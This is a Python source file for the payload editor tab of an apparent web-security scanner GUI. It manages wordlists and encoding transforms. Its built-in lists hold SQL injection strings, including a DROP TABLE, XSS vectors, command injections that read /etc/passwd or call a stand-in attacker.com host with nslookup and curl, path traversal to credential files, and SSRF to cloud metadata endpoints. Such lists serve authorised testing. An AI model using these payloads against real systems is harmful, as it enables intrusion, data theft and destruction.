"""
PAYLOAD EDITOR Tab
Manage custom wordlists, payloads, and transformations for scan modules.
"""
import flet as ft
import os
import base64
import urllib.parse
import json
from gui.theme import *


# Default built-in payloads per category
BUILTIN_PAYLOADS = {
    "SQLi": [
        "' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT NULL--",
        "1' AND '1'='1", "admin'--", "1; DROP TABLE users--",
        "' OR 1=1#", "') OR ('1'='1", "1' ORDER BY 1--",
        "' UNION ALL SELECT 1,2,3--", "-1' UNION SELECT 1,@@version--",
    ],
    "XSS": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg/onload=alert(1)>",
        "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>", "{{7*7}}", "${7*7}",
    ],
    "Command Injection": [
        "; ls", "| cat /etc/passwd", "$(id)", "`whoami`",
        "|| dir", "& ipconfig", "; ping -c 1 127.0.0.1",
        "|nslookup $(whoami).attacker.com", "$(curl attacker.com)",
    ],
    "Path Traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f",
        "..%252f..%252f..%252fetc/passwd", "/etc/passwd%00",
    ],
    "SSRF": [
        "http://127.0.0.1:80", "http://localhost", "http://[::1]",
        "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
        "file:///etc/passwd", "dict://127.0.0.1:11211/info",
    ],
    "Headers": [
        "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1",
        "Host: localhost", "X-Forwarded-Host: localhost",
    ],
}


class PayloadEditorTab:
    def __init__(self, page: ft.Page):
        self.page = page
        self.current_category = "SQLi"
        self.custom_payloads = {}  # category → [payloads]
        self._load_custom()
        
        # Category selector
        self.category_dropdown = ft.Dropdown(
            options=[ft.dropdown.Option(cat) for cat in BUILTIN_PAYLOADS],
            value="SQLi", width=200,
            text_style=ft.TextStyle(font_family="Consolas", size=11, color=COLOR_TEXT_MAIN),
            border_color=COLOR_BORDER_SUBTLE, focused_border_color=COLOR_ACCENT_PRIMARY,
            bgcolor=COLOR_BG_INPUT, border_radius=4,
            on_change=self._on_category_change
        )
        
        # Payload list
        self.payload_list = ft.Column(scroll=ft.ScrollMode.AUTO, expand=True, spacing=2)
        
        # Add custom payload
        self.new_payload_input = ft.TextField(
            hint_text="Enter custom payload...",
            text_style=ft.TextStyle(font_family="Consolas", size=11, color=COLOR_TEXT_MAIN),
            border_color=COLOR_BORDER_SUBTLE, focused_border_color=COLOR_ACCENT_PRIMARY,
            bgcolor=COLOR_BG_INPUT, height=35, expand=True, border_radius=4, content_padding=8,
            on_submit=self._add_payload
        )
        self.btn_add = ft.IconButton(
            icon=ft.Icons.ADD_CIRCLE, icon_color=COLOR_ACCENT_PRIMARY, icon_size=20,
            tooltip="Add payload", on_click=self._add_payload
        )
        
        # Transformation tools
        self.transform_input = ft.TextField(
            hint_text="Input text to transform...",
            text_style=ft.TextStyle(font_family="Consolas", size=11, color=COLOR_TEXT_MAIN),
            border_color=COLOR_BORDER_SUBTLE, focused_border_color=COLOR_ACCENT_PRIMARY,
            bgcolor=COLOR_BG_INPUT, height=35, expand=True, border_radius=4, content_padding=8,
        )
        self.transform_output = ft.TextField(
            read_only=True, multiline=True, min_lines=2, max_lines=4,
            text_style=ft.TextStyle(font_family="Consolas", size=11, color="#00e676"),
            border_color=COLOR_BORDER_SUBTLE, bgcolor="#0a0a0a", border_radius=4, content_padding=8,
            label="Output", label_style=ft.TextStyle(size=10, color=COLOR_TEXT_DIM)
        )
        
        # Import/Export
        self.import_input = ft.TextField(
            hint_text="Paste payloads (one per line) or file path...",
            multiline=True, min_lines=3, max_lines=6,
            text_style=ft.TextStyle(font_family="Consolas", size=10, color=COLOR_TEXT_DIM),
            border_color=COLOR_BORDER_SUBTLE, bgcolor=COLOR_BG_INPUT, border_radius=4, content_padding=8,
        )
        
        # Stats
        self.stats_text = ft.Text("", size=10, color=COLOR_TEXT_DIM, font_family="Consolas")
        
        # Load initial
        self._refresh_list()
    
    def get_content(self):
        return ft.Container(
            padding=15, bgcolor=COLOR_SURFACE, border_radius=8,
            content=ft.Column([
                # Header
                ft.Row([
                    ft.Icon(ft.Icons.CODE, color=COLOR_ACCENT_PRIMARY),
                    ft.Text("PAYLOAD EDITOR", size=14, weight="bold", color="white", font_family="Consolas"),
                    ft.Container(expand=True),
                    self.stats_text,
                ]),
                ft.Divider(color=COLOR_BORDER_SUBTLE),
                
                ft.Row([
                    # Left: Payload Manager
                    ft.Container(
                        width=400, expand=False,
                        content=ft.Column([
                            ft.Row([
                                self.category_dropdown,
                                ft.Container(expand=True),
                                ft.IconButton(ft.Icons.DELETE_SWEEP, icon_size=16, icon_color=COLOR_TEXT_DIM,
                                            tooltip="Reset to defaults", on_click=self._reset_category),
                            ]),
                            ft.Row([self.new_payload_input, self.btn_add], spacing=5),
                            ft.Divider(color=COLOR_BORDER_SUBTLE, height=1),
                            self.payload_list,
                        ], expand=True),
                        bgcolor=COLOR_BG_PANEL, border_radius=6, padding=10,
                        border=ft.border.all(1, COLOR_BORDER_SUBTLE),
                    ),
                    
                    # Right: Transformations + Import
                    ft.Container(
                        expand=True,
                        content=ft.Column([
                            ft.Text("TRANSFORMATIONS", size=11, weight="bold", color=COLOR_ACCENT_PRIMARY, font_family="Consolas"),
                            self.transform_input,
                            ft.Row([
                                ft.OutlinedButton("URL Encode", on_click=lambda e: self._transform("url_encode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("URL Decode", on_click=lambda e: self._transform("url_decode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("Base64 Enc", on_click=lambda e: self._transform("b64_encode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("Base64 Dec", on_click=lambda e: self._transform("b64_decode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("Hex", on_click=lambda e: self._transform("hex_encode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("HTML Ent", on_click=lambda e: self._transform("html_encode"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                                ft.OutlinedButton("Double URL", on_click=lambda e: self._transform("double_url"), height=28,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4), padding=ft.padding.symmetric(horizontal=8))),
                            ], wrap=True, spacing=5),
                            self.transform_output,
                            
                            ft.Container(height=15),
                            ft.Text("BULK IMPORT", size=11, weight="bold", color=COLOR_ACCENT_PRIMARY, font_family="Consolas"),
                            self.import_input,
                            ft.Row([
                                ft.ElevatedButton("Import Payloads", icon=ft.Icons.UPLOAD_FILE,
                                    style=ft.ButtonStyle(bgcolor=COLOR_ACCENT_PRIMARY, color="black", shape=ft.RoundedRectangleBorder(radius=4)),
                                    height=30, on_click=self._import_payloads),
                                ft.OutlinedButton("Export Current", icon=ft.Icons.DOWNLOAD,
                                    style=ft.ButtonStyle(color=COLOR_TEXT_DIM, side=ft.BorderSide(1, COLOR_BORDER_SUBTLE), shape=ft.RoundedRectangleBorder(radius=4)),
                                    height=30, on_click=self._export_payloads),
                            ], spacing=8),
                        ], expand=True, scroll=ft.ScrollMode.AUTO),
                        bgcolor=COLOR_BG_PANEL, border_radius=6, padding=10,
                        border=ft.border.all(1, COLOR_BORDER_SUBTLE),
                    ),
                ], expand=True, spacing=10),
            ], expand=True)
        )
    
    def _get_payloads(self, category):
        """Get payloads for a category (custom + built-in)."""
        builtin = BUILTIN_PAYLOADS.get(category, [])
        custom = self.custom_payloads.get(category, [])
        return custom + builtin
    
    def _refresh_list(self):
        """Refresh the payload list display."""
        self.payload_list.controls.clear()
        payloads = self._get_payloads(self.current_category)
        custom_set = set(self.custom_payloads.get(self.current_category, []))
        
        for idx, payload in enumerate(payloads):
            is_custom = payload in custom_set
            row = ft.Container(
                content=ft.Row([
                    ft.Text(payload, size=10, color=COLOR_TEXT_MAIN if not is_custom else "#00e676",
                           font_family="Consolas", expand=True, selectable=True, max_lines=1,
                           overflow=ft.TextOverflow.ELLIPSIS),
                    ft.IconButton(ft.Icons.CONTENT_COPY, icon_size=14, icon_color=COLOR_TEXT_DIM,
                                tooltip="Copy", on_click=lambda e, p=payload: self._copy_payload(p)),
                    ft.IconButton(ft.Icons.TRANSFORM, icon_size=14, icon_color=COLOR_TEXT_DIM,
                                tooltip="Send to transform", on_click=lambda e, p=payload: self._send_to_transform(p)),
                    *([ ft.IconButton(ft.Icons.DELETE, icon_size=14, icon_color=COLOR_SEV_CRITICAL,
                                tooltip="Delete", on_click=lambda e, p=payload: self._delete_payload(p))
                    ] if is_custom else []),
                ], spacing=2, vertical_alignment=ft.CrossAxisAlignment.CENTER),
                padding=ft.padding.symmetric(horizontal=6, vertical=2),
                border_radius=3,
                bgcolor="#111118" if idx % 2 == 0 else "transparent",
            )
            self.payload_list.controls.append(row)
        
        total = sum(len(self._get_payloads(c)) for c in BUILTIN_PAYLOADS)
        custom_total = sum(len(v) for v in self.custom_payloads.values())
        self.stats_text.value = f"{len(payloads)} payloads | {total} total | {custom_total} custom"
        
        try: self.page.update()
        except: pass
    
    def _on_category_change(self, e):
        self.current_category = self.category_dropdown.value
        self._refresh_list()
    
    def _add_payload(self, e=None):
        text = self.new_payload_input.value
        if not text: return
        if self.current_category not in self.custom_payloads:
            self.custom_payloads[self.current_category] = []
        if text not in self.custom_payloads[self.current_category]:
            self.custom_payloads[self.current_category].append(text)
        self.new_payload_input.value = ""
        self._save_custom()
        self._refresh_list()
    
    def _delete_payload(self, payload):
        if self.current_category in self.custom_payloads:
            try:
                self.custom_payloads[self.current_category].remove(payload)
                self._save_custom()
                self._refresh_list()
            except ValueError:
                pass
    
    def _reset_category(self, e=None):
        self.custom_payloads.pop(self.current_category, None)
        self._save_custom()
        self._refresh_list()
    
    def _copy_payload(self, payload):
        try:
            self.page.set_clipboard(payload)
            self.page.snack_bar = ft.SnackBar(ft.Text("Copied to clipboard", color="white", size=11), bgcolor="#333", duration=1500)
            self.page.snack_bar.open = True
            self.page.update()
        except: pass
    
    def _send_to_transform(self, payload):
        self.transform_input.value = payload
        try: self.page.update()
        except: pass
    
    def _transform(self, mode):
        text = self.transform_input.value or ""
        try:
            if mode == "url_encode":
                result = urllib.parse.quote(text, safe="")
            elif mode == "url_decode":
                result = urllib.parse.unquote(text)
            elif mode == "b64_encode":
                result = base64.b64encode(text.encode()).decode()
            elif mode == "b64_decode":
                result = base64.b64decode(text).decode("utf-8", errors="replace")
            elif mode == "hex_encode":
                result = text.encode().hex()
            elif mode == "html_encode":
                import html
                result = html.escape(text)
            elif mode == "double_url":
                result = urllib.parse.quote(urllib.parse.quote(text, safe=""), safe="")
            else:
                result = text
            self.transform_output.value = result
        except Exception as ex:
            self.transform_output.value = f"Error: {ex}"
        try: self.page.update()
        except: pass
    
    def _import_payloads(self, e=None):
        text = self.import_input.value or ""
        lines = [l.strip() for l in text.strip().split("\n") if l.strip()]
        
        # Check if it's a file path
        if len(lines) == 1 and os.path.isfile(lines[0]):
            try:
                with open(lines[0], "r", encoding="utf-8") as f:
                    lines = [l.strip() for l in f.readlines() if l.strip()]
            except Exception:
                pass
        
        if not lines: return
        
        if self.current_category not in self.custom_payloads:
            self.custom_payloads[self.current_category] = []
        
        added = 0
        for line in lines:
            if line not in self.custom_payloads[self.current_category]:
                self.custom_payloads[self.current_category].append(line)
                added += 1
        
        self._save_custom()
        self._refresh_list()
        self.import_input.value = ""
        
        try:
            self.page.snack_bar = ft.SnackBar(
                ft.Text(f"Imported {added} payloads to {self.current_category}", color="white"), 
                bgcolor="#2e7d32", duration=3000
            )
            self.page.snack_bar.open = True
            self.page.update()
        except: pass
    
    def _export_payloads(self, e=None):
        payloads = self._get_payloads(self.current_category)
        if not payloads: return
        self.import_input.value = "\n".join(payloads)
        try: self.page.update()
        except: pass
    
    def _save_custom(self):
        """Save custom payloads to file."""
        os.makedirs("data", exist_ok=True)
        try:
            with open(os.path.join("data", "custom_payloads.json"), "w") as f:
                json.dump(self.custom_payloads, f, indent=2)
        except Exception:
            pass
    
    def _load_custom(self):
        """Load custom payloads from file."""
        path = os.path.join("data", "custom_payloads.json")
        if os.path.exists(path):
            try:
                with open(path, "r") as f:
                    self.custom_payloads = json.load(f)
            except Exception:
                self.custom_payloads = {}
